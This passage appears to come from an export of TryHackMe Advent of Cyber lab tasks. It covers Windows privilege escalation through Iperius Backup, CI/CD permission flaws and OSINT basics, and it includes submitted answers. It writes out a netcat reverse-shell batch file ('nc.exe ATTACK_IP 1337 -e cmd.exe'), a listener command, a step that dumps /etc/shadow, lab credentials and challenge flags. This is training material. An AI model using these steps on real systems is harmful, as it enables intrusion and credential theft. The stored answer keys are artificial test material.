doesn't always result in a failure of the application, and the application can still run. Finding a DLL the application is looking for in a location we can write to can help us create a malicious DLL file that will be run by the application. In such a case, the malicious DLL will run with the main application's privilege level. If the application has a higher privilege level than our current user, this could allow us to launch a shell with a higher privilege level.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Unquoted Service Path: If the executable path of a service contains a space and is not enclosed within quotes, a hacker could introduce their own malicious executables to run instead of the intended executable.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Always Install Elevated: Windows applications can be installed using Windows Installer (also known as MSI packages) files. These files make the installation process easy and straightforward. Windows systems can be configured with the \"AlwaysInstallElevated\" policy. This allows the installation process to run with administrator privileges without requiring the user to have these privileges. This feature allows users to install software that may need higher privileges without having this privilege level. If \"AlwaysInstallElevated\" is configured, a malicious executable packaged as an MSI file could be run to obtain a higher privilege level.</span></li><li style=\"background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Other software: Software, applications, or scripts installed on the target machine may also provide privilege escalation vectors.</span></li></ul><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Ideally, McSkidy should explore all these. Privilege escalation does not have a silver bullet, and the vector that will work depends not only on the configuration of the target system but, in some cases, to user behaviour (e.g. finding a passwords.txt file on the desktop where the user notes his account passwords). In some cases, you will need to combine two or more vectors to achieve the desired result.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\"><span style=\"background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt;font-size:24px\">Initial Information Gathering</span></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Information gathering is an important step in privilege escalation because this is how you can uncover potential vectors. Some automated scripts are available to quickly enumerate most of the known vectors listed above. However, in real penetration testing engagements, you will often need to do some additional research based on these scripts' results.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">A few key points in enumeration are as follows:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Users on the target system. The </span><code style=\"font-size:14px\">net users</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> command will list users on the target system.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">OS version: The </span><code style=\"font-size:14px\">systeminfo | findstr /B /C: \"OS Name\"/C: \"OS Version\"</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> command will output information about the operating system. This should be used to do further research on whether a privilege escalation vulnerability exists for this version.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Installed services: the </span><code style=\"font-size:14px\">wmic service list</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> command will list services installed on the target system</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">In a real engagement, you should follow the more extensive list of commands provided in our Windows Privilege Escalation Room.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"font-weight:bolder\"><span style=\"background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt;font-size:24px\">Exploitation</span></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">The Iperius Backup Service suffers from a privilege escalation vulnerability. McSkidy could use it to elevate her privileges on the system. When Iperius Backup is installed as a service, it can be configured to run backup tasks with administrator privileges even if the current user has a lower privilege level.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Let's explore the exploitation steps:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">1) Create a new backup task: The task itself is not important. You can set the backup path as C:\\Users\\McSkidy\\Documents</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">2) Set the destination: From the destination tab, you can set the location where the backup will be written. Again, this is not important; you can set it to C:\\Users\\McSkidy\\Desktop</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">3) Other processes: The \"other processes\" tab is important. As you can see, this gives us the option to set a program to run before or after every backup process. As the backup process is ran with administrator privileges, any program or external file configured here will be ran with administrator privileges. To exploit this, we will create a simple bat file and set it to run before the backup.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">The .bat file will launch a shell using the nc.exe utility (conveniently located at C:\\Users\\McSkidy\\Downloads\\nc.exe). Launch the Notepad text editor and enter the following lines of code.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><code style=\"font-size:14px\">@echo off</code></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><code style=\"font-size:14px\">C:\\Users\\McSkidy\\Downloads\\nc.exe ATTACK_IP 1337 -e cmd.exe</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"></span></p><p align=\"center\" style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">You will need to replace \"ATTACK_IP\" with your attacking machine's IP address; we recommend starting the AttackBox (blue button at the top of this page).</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">You can save the file as evil.bat on the desktop of the target system (MACHINE_IP) and select it by enabling the \"run a program or open external file\" option. Click OK, and you should see a backup job named \"documents\" on the Iperius dashboard.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">4) Launch a listener: The evil.bat file will launch cmd.exe and connect back to our attacking machine on port 1337. We should have a listener ready to accept this incoming connection. You can launch </span><code style=\"font-size:14px\">nc</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">on your attacking machine with the </span><code style=\"font-size:14px\">nc -nlvp 1337</code><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> command.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">5) Run as service: Right-click on the \"document\" backup job previously created and select the \"Run backup as service option\".</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">6) Have a shelly Christmas! Within a minute or so, you should see an incoming connection on your attack</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt;font-size:24px\">Further Reading</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;background:transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Privilege escalation is an important topic for penetration tests and various professional certificate exams. You can visit the rooms below to learn more about different techniques used for privilege escalation:</span></p><ul><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><a href=\"https://tryhackme.com/jr/winprivesc\" target=\"_blank\">Windows privilege escalation</a></span></li><li style=\"color:rgb(14, 16, 26);background:none 0% 0% repeat scroll transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><a href=\"https://tryhackme.com/jr/linprivesc\" target=\"_blank\">Linux privilege escalation</a></span></li></ul><p style=\"margin-top:0pt;margin-bottom:0pt;background:none 0% 0% repeat scroll transparent;color:rgb(14, 16, 26)\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p align=\"center\" style=\"margin-top:0pt;margin-bottom:0pt;background:none 0% 0% repeat scroll transparent;color:rgb(14, 16, 26)\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/898063d13e178ef01f6442c84270e40e.png\" style=\"width:269px\" /><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"></span><br /></p>","taskType":"vm","taskNo":18,"taskCreated":"2021-11-16T13:45:27.300Z","taskDeadline":null,"tasksInfo":[{"question":"Complete the username: p.....","hint":"Use the \"net users\" command to list users on the target system","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"pepper","noAnswer":false,"answerDesc":"Answer format: ******"},{"question":"<p>What is the OS version?<br /></p>","hint":"Use the systeminfo | findstr /B /C: \"OS Name\"/C: \"OS Version\" to list the OS version","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"10.0.17763 N/A Build 17763","noAnswer":false,"answerDesc":"Answer format: **.*.***** */* ***** *****"},{"question":"<p>What backup service did you find running on the system?<br /></p>","hint":"Use the wmic service list command to list running services. (IperiusSvc)","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"IperiusSvc","noAnswer":false,"answerDesc":"Answer format: **********"},{"question":"<p>What is the path of the executable for the backup service you have identified?<br /></p>","hint":"Use the wmic service list command to list running services. Look for the location of IperiusService.exe ","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"C:\\Program Files (x86)\\Iperius Backup\\IperiusService.exe","noAnswer":false,"answerDesc":"Answer format: *:******** ***** ************* *********************.***"},{"question":"<p>Run the whoami command on the connection you have received on your attacking machine. What user do you have?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"the-grinch-hack\\thegrinch","noAnswer":false,"answerDesc":"Answer format: *************************"},{"question":"<p>What is the content of the flag.txt file?<br /></p>","hint":"He forgot it in the Documents folder. ","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM-736635221","noAnswer":false,"answerDesc":"Answer format: *************"},{"question":"<p>The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?<br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"jazzercize","noAnswer":false,"answerDesc":"Answer format: **********"}],"uploadId":"618b71c87a50960049333007","questions":[{"questionNo":1,"question":"Complete the username: p.....","hint":"Use the \"net users\" command to list users on the target system"},{"questionNo":2,"question":"<p>What is the OS version?<br /></p>","hint":"Use the systeminfo | findstr /B /C: \"OS Name\"/C: \"OS Version\" to list the OS version"},{"questionNo":3,"question":"<p>What backup service did you find running on the system?<br /></p>","hint":"Use the wmic service list command to list running services. (IperiusSvc)"},{"questionNo":4,"question":"<p>What is the path of the executable for the backup service you have identified?<br /></p>","hint":"Use the wmic service list command to list running services. Look for the location of IperiusService.exe "},{"questionNo":5,"question":"<p>Run the whoami command on the connection you have received on your attacking machine. What user do you have?<br /></p>","hint":""},{"questionNo":6,"question":"<p>What is the content of the flag.txt file?<br /></p>","hint":"He forgot it in the Documents folder. "},{"questionNo":7,"question":"<p>The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?<br /></p>","hint":""}]},{"taskTitle":"[Day 14] <span class=\"badge badge-soft-warning size-16\">Networking</span> Dev(Insecure)Ops","taskDesc":"<p align=\"center\"><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Story</span></span><br /></p><p>McDev - the head of the dev team, sends an alarming email stating that they're unable to update the best festival company's external web application. Without this update, no one can view the Best Festival Company's plan. The dev team has been using a CI/CD server to automatically push out updates to the server but the CI/CD server has been compromised. Can you help them get their server back?</p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Learning Objectives</span></span></p><ol><li>Understanding the CI/CD concept<br /></li><li>Overview of risks associated with CI/CD<br /></li><li>Having a basic understanding of CI/CD exploitation vectors</li></ol><h2><span style=\"font-size:24px\">Check out Davin's walkthrough video for day 14 </span><a href=\"https://www.youtube.com/watch?v=NJVGTVbmWKM\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><span style=\"font-size:24px\">What is CI/CD?</span><br /><p>CI/CD are two terms that will often come up when talking about software development and DevOps. Their definitions are pretty straightforward.<br />CI: Continuous Integration is the process in which software source code is kept in a central repository (such as GitHub). All changes are stored in this central repository to avoid ending up with different versions of the same code.<br />CD: Continuous Delivery is the following (sometimes integral) step of the continuous integration model where code is automatically deployed to the test, pre-production, or production environments. CD is sometimes used as an acronym for \"Continuous Deployment\". If you feel like the terms above don't seem to have clear limits, you are right. CI, CD, and the other CD are all part of DevOps best practices that aim to make code delivery faster and more reliable.<br /><br />CI/CD should be considered as a set of practices that are put in place to enable development teams to make changes, test their code, and deploy the application more reliably.</p>We should think of CI/CD as a continuous process or loop that includes steps of the software development process.<br /><p><br /><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Risks Associated with CI/CD</span></span><br />The CI/CD integration approach seems to be an effective way to mitigate risks that may result from manually aggregating changes made to the code, manually testing them, and manually deploying the updated version of the application. However, some risks associated with the CI/CD process should be taken into consideration when dealing with such an integration. As a penetration tester, one of our goals would be to uncover weaknesses in the automation process. These can vary from file permissions to configuration errors made when installing any CI/CD automation software. DevOps teams typically use software such as Jenkins, GitLab, Bamboo, AWS CodePipeline, etc., to automate CI/CD steps summarized above.<br /><br />Major risks related to a CI/CD integration are mentioned below:</p><ul><li>Access security: The increasing number of integration points can make access management difficult. Any component integrated with the process may need partial or full access to another component. In this case, allowing too much access can also open a path for malicious activity.</li><li>Permissions: Components are connected with each other and perform their tasks with user accounts. Similar to access security, user permissions should be checked.</li><li>Keys and secrets: Many integrations are done using keys (API keys, ID keys, etc.) or secrets. These should be secured. Otherwise, anyone could potentially access resources using this authentication method.</li><li>User security: User accounts are another successful attack vector often used by cybercriminals. Any user who has access to the source code repository could include a malicious component in the codebase and could be included in the deployed application.</li><li>Default configuration: Some platforms are known to have default credentials and vulnerabilities. If the default credentials are not changed, and in use within the CI/CD process, this could result in the complete compromise of the infrastructure.</li></ul><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">The Grinch CI/CD</span><br /></span>The Grinch has put his own version of a CI/CD pipeline in place. He has used BASH scripts and scheduled jobs to automate the process. Let's dive in.<br /><br />Visiting MACHINE_IP from your browser will show the Grinch is waiting for the loot, but not here.<br /><br />At this stage, we can run a <code style=\"font-size:14px\">dirb</code> scan to discover the MACHINE_IP/admin page, which looks more promising.<br /><br />Looking at the source code, we see something interesting. There is an iFrame that refers to the <code style=\"font-size:14px\">ls.html</code> page. This page seems suspiciously close to the output from running the <code style=\"font-size:14px\">ls</code>command.<br /><br />Connect to the target machine using in-browser access or via <code style=\"font-size:14px\">SSH</code> with the credentials below:<br />username: mcskidy<br />password: Password1<br /><br />Navigating to the <code style=\"font-size:14px\">/home/thegrinch/scripts</code> folder and running the <code style=\"font-size:14px\">ls</code> command will show that most of the scripts in the folder are not accessible by the McSkidy user.<br />The content of the <code style=\"font-size:14px\">loot.sh</code> script gives us a clearer understanding of the <code style=\"font-size:14px\">ls.html</code> file we have located earlier.<br /><br />The code is simple; it runs the <code style=\"font-size:14px\">ls</code> command and prints the output to the ls.html file. The Grinch can browse the page from anywhere within the network to see the loot he has accumulated.<br />Clever, this Grinch. However, there seems to be a problem regarding the permissions of his continuous integration attempt. McSkidy can change the contents of the <code style=\"font-size:14px\">loot.sh</code> file.<br /><br />Change the code in the file to print the contents of the <code style=\"font-size:14px\">/etc/shadow</code> file. This will be conclusive proof that this permission misconfiguration not only creates a threat for the CI process but can also be used to escalate our privileges. If you are interested in learning more about privilege escalation techniques, please visit our Linux Privilege Escalation room.<br /><br />This misconfiguration can be leveraged to read the contents of the Grinch's other scripts.<br />Let's have a look at the <code style=\"font-size:14px\">check.sh</code> script using the vulnerability we have used to read the <code style=\"font-size:14px\">/etc/shadow</code> file.<br /><br />Within a couple of minutes, the MACHINE_IP/admin page will be updated to reveal the code of the <code style=\"font-size:14px\">check.sh</code> script.<br /><br />This script checks for the existence of a file named <code style=\"font-size:14px\">remindme.txt</code> in the loot folder. If it finds the file, it prints the Grinch's password to an HTML file that will appear in MACHINE_IP/pass.html<br /><br />Grinch's memory isn't what it used to be.<br /><br />Alternatively, McSkidy could create a file named <code style=\"font-size:14px\">remindme.txt</code> in the <code style=\"font-size:14px\">/home/thegrinch/loot</code> folder and wait for the automation to work its magic.<br />Can you answer question 4 using this vector?</p><p><img src=\"https://assets.tryhackme.com/img/aoc-christmas.png\" style=\"width:538px\" /><br /><br /><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Lessons Learned</span></span><br />This CI/CD simulation aimed to help showcase major types of vulnerabilities that are often seen in CI/CD automation. A locally installed Jenkins application can have an unpatched component deployed for various operational reasons. However, it is rare that a critical vulnerability remains unpatched for an extended period of time on infrastructure managed by a cloud service provider such as Amazon, Azure, or Google. This is the main reason you will more often see vulnerabilities being a result of improper access management, lax account privileges, or logic flaws.<br /><br />In the example above, we have seen:</p><ul><li><span style=\"font-weight:bolder\">Folder permissions that were too lax</span>: The low privileged McSkidy user could write to the Grinch's \"loot\" folder.</li><li><span style=\"font-weight:bolder\">File permissions were misconfigured:</span> The low privileged McSkidy user could change the contents of the loot.sh script.</li><li><span style=\"font-weight:bolder\">Improper key protection:</span> In this example, Grinch's password can be seen as the secret key used to connect CI/CD components. If the key can be read from a configuration file, the attacker can reuse this key to their advantage.<br /></li><li><span style=\"font-weight:bolder\">Installation was not secure:</span> cronjobs were regularly running tasks without any controls for unauthorized changes. As you may have read in sector news, a similar lack of controls has led to the release of backdoored software.</li></ul>","taskType":"vm","taskNo":19,"taskCreated":"2021-11-16T13:45:28.313Z","taskDeadline":null,"tasksInfo":[{"question":"How many pages did the dirb scan find with its default wordlist?","hint":"You can use dirb with its default wordlist (dirb HTTP://target_IP)","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"4","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>How many scripts do you see in the /home/thegrinch/scripts folder?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"4","noAnswer":false,"answerDesc":"Answer format: *"},{"question":"<p>What are the five characters following $6$G in pepper's password hash?<br /></p>","hint":"Replace the ls command with cat /etc/shadow","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"ZUP42","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>What is the content of the flag.txt file on the Grinch's user’s desktop?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"DI3H4rdIsTheBestX-masMovie!","noAnswer":false,"answerDesc":"Answer format: ***************************"}],"uploadId":"618d7b7050742000473765aa","questions":[{"questionNo":1,"question":"How many pages did the dirb scan find with its default wordlist?","hint":"You can use dirb with its default wordlist (dirb HTTP://target_IP)"},{"questionNo":2,"question":"<p>How many scripts do you see in the /home/thegrinch/scripts folder?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What are the five characters following $6$G in pepper's password hash?<br /></p>","hint":"Replace the ls command with cat /etc/shadow"},{"questionNo":4,"question":"<p>What is the content of the flag.txt file on the Grinch's user’s desktop?<br /></p>","hint":""}]},{"taskTitle":"[Day 15] <span class=\"badge size-16\" style=\"background-color:rgba(123,198,252,.18);color:#7bc6fc\">Cyber Careers</span> The Grinchs day off","taskDesc":"<p>McSkidy is exhausted, as defeating the Grinch is hard work! She thinks back to her early days when deciding which cyber career to pursue. Luckily for McSkidy, the Grinch has taken today off, giving you time to think about what career you'd like to go into after saving Christmas.</p><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-size:1rem\">Open the site attached to this task and use the quiz to find out more about different cyber security careers!</span></p><p><a href=\"https://static-labs.tryhackme.cloud/sites/careers-quiz\" target=\"_blank\"><img style=\"width:758.5px;height:398.206px\" src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/5188d4a77df775020f3fd140519de095.png\" /></a><span style=\"font-size:1rem\"><br /></span></p><p>Read these success stories, and see how TryHackMe has helped people get a career in the cyber industry:</p><ul><li><a href=\"https://tryhackme.com/resources/blog/brandons-success-story\" target=\"_blank\">Brandon</a> - Securing a security career right <span style=\"font-weight:bolder\">after University</span></li><li><a href=\"https://tryhackme.com/resources/blog/construction-worker-to-security-engineer-how-paul-used-tryhackme-to-land-his-first-job-in-security\" target=\"_blank\">Paul</a> - From <span style=\"font-weight:bolder\">construction worker</span> to <span style=\"font-weight:bolder\">security engineer</span></li><li><a href=\"https://tryhackme.com/resources/blog/the-teacher-becomes-the-student\" target=\"_blank\">Kassandra</a> - The teacher becomes the student, <span style=\"font-weight:bolder\">from school teacher</span> to <span style=\"font-weight:bolder\">security professional</span></li><li><a href=\"https://tryhackme.com/resources/blog/kennys-success-story\" target=\"_blank\">Kenny</a> - From IT Manager to Security Analyst</li></ul><p><i>There is no video for today.</i></p>","taskType":"static-site","taskNo":20,"taskCreated":"2021-11-16T13:45:29.405Z","taskDeadline":null,"tasksInfo":[{"question":"Complete the quiz, and share what cyber security career was recommended on Twitter, LinkedIn, Instagram or Facebook!","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Enroll in a TryHackMe learning path that was shown on the career quiz!<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"61b3e637437056aee200e415","questions":[{"questionNo":1,"question":"Complete the quiz, and share what cyber security career was recommended on Twitter, LinkedIn, Instagram or Facebook!","hint":""},{"questionNo":2,"question":"<p>Enroll in a TryHackMe learning path that was shown on the career quiz!<br /></p>","hint":""}],"staticSites":[{"autoOpen":false,"title":"Cyber Careers Quiz","url":"https://static-labs.tryhackme.cloud/sites/careers-quiz"}]},{"taskTitle":"[Day 16] <span class=\"badge badge-soft-dark size-16\">OSINT</span> Ransomware Madness","taskDesc":"<p><span style=\"font-size:24px\">Story</span></p><p>Grinch Enterprises has decided to use the best festival company to try their new ransomware service. While they think that this is a great proving ground, McSkidy is adamant to determine their goals and share them with the wider security community - can you use your open source intelligence methods to find out more information about their ransomware gang!</p><h2><span style=\"font-size:24px\">Check out Alh4zr3d's walkthrough video for day 16 </span><a href=\"https://youtu.be/FLIDaavQ9aM\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><p><span style=\"font-size:24px\">Learning Objectives</span></p><ul><li>Understanding what OSINT is and where it originates</li><li>Understand the implications of OSINT and how it can be used for reconnaissance and information gathering</li><li>Learn how to conduct an OSINT investigation to gather information on an individual</li></ul><p><span style=\"font-size:24px\">OSINT &amp; The Digital Footprint</span></p><p>OSINT stands for Open Source Intelligence, information that can be obtained from free and public sources. Offensive teams commonly use OSINT to perform reconnaissance on a target, an individual, or a corporation. Agencies and law enforcement can also leverage OSINT to gather information.<br /></p><p>OSINT may seem scary at first; where do I find this information? Will I get in trouble? No need to worry; most OSINT operations are straightforward using tools you are already familiar with on the clearnet.<br /></p><p>OSINT is an extensive-term. It is an overarching term of many different intelligence disciplines; however, in this task, we will be covering the topic as it is commonly known. Information is at the core of OSINT; information is typically found in two places,<br /></p><ul><li>Clearnet: This refers to anything you can publicly access from your traditional web browser, including,<br /><ul><li>Facebook</li><li>Twitter</li><li>GitHub</li></ul></li><li>Darknet: The darknet is accessed using special software and requires additional configuration; it is most commonly used by privacy-minded individuals, whistleblowers, censored people, criminals, journalists, and government law enforcement agencies. Below are a few examples of what the darknet has to offer,<ul><li>TOR</li><li>Freenet</li><li>I2P</li><li>IPFS</li><li>Zeronet</li></ul></li></ul><p>In this task, we will be focusing on how we can leverage the clearnet to our advantage to gather information on a specified target. The clearnet is more often used due to the vast amount of public data.<br /></p><p>Information used in OSINT originates from your digital footprint. This may seem like a \"buzz\" word, but it is key to why OSINT can be rewarding. When conducting OSINT, we look at what data a target left behind to lead us to the information/objective we are seeking.</p><p><span style=\"font-size:24px\">OSINT Process Cycle</span></p><p>When conducting an OSINT investigation, each individual and team will have their methodology to approach the task. The approach to OSINT can be quantified through models and systematic steps to follow. We will briefly look at two RIS OSINT information models from this <a href=\"https://arnoreuser.com/wp-content/uploads/2018/12/201712-The-RIS-OSINT-Intelligence-Cycle.pdf\" target=\"_blank\">research paper</a>.</p><p>The RIS OSINT data-information model outlines an approach to gathering information to identify and categorize data.</p><div style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/88f137b6e95bfb541532a6580a74734e.png\" style=\"font-size:1rem\" /></div><p>Intelligence is obtained from information that is obtained from data. Intelligence will ultimately lead you or your customer to a decision. This decision will determine where in the next model you will move. </p><p>The RIS OSINT Roller Coaster outlines phases of an OSINT investigation centering around the client. This is an ever-evolving process that will change and continue depending on intelligence and decisions from the previous model.</p><div style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/8faa6f8c3218aa5e6c4dfc01648b0972.png\" style=\"font-size:1rem\" /></div><div style=\"text-align:center\"><br /></div><table class=\"table table-bordered\" style=\"width:1076px\"><tbody><tr><td><span style=\"font-weight:bolder\">RSI Phase</span></td><td><span style=\"font-weight:bolder\">Definition</span></td><td><span style=\"font-weight:bolder\">Example</span></td></tr><tr><td>Client</td><td>What is the question/objective?</td><td>Email</td></tr><tr><td>Source</td><td>What is available on the objective?</td><td>Email servers, etc.</td></tr><tr><td>Monitoring</td><td>What is happening with the objective?</td><td>Email has been inactive</td></tr><tr><td>Selecting/Finding</td><td>Where is the objective? How can we find/identify the objective?</td><td>Clearnet, Gmail, etc.</td></tr><tr><td>Acquisition</td><td>How can we get the objective?</td><td>Leaked database</td></tr><tr><td>Indexing</td><td>How is the objective retrievable?</td><td>Dehashed</td></tr><tr><td>Syntheses</td><td>How can we combine this objective with others?</td><td>Identify information from email</td></tr><tr><td>Dissemination</td><td>How can you action/quantify this objective?</td><td>Report/Plan</td></tr></tbody></table><p><span style=\"font-size:24px\">Account Discovery &amp; Analysis</span></p><p>Accounts are a prevalent and well-known part of a target's footprint. Accounts can include any public accounts linked to the target or a target persona, including but not limited to Facebook, Twitter, Reddit, etc.<br /></p><p></p><p>When analyzing a target's account, we are commonly looking at the following objectives,<br /></p><table class=\"table table-bordered\" style=\"width:1076px\"><tbody><tr><td><span style=\"font-weight:bolder\">Objective</span></td><td><span style=\"font-weight:bolder\">Purpose</span></td></tr><tr><td>Identify real or personas</td><td>A target will often use a persona. Depending on initial information, we are looking for their real name or persona to find other accounts. Our end objective is to identify further information and accounts owned by our target.<br /></td></tr><tr><td>Identify email</td><td>This is less common to find openly but can help identify further information of the target and other sources.<br /></td></tr><tr><td>Locate linked accounts</td><td>Targets will often link other public accounts leading you to further information or their real name/persona.<br /></td></tr><tr><td>History</td><td>The importance of a target's post history will depend on your objective. This could be 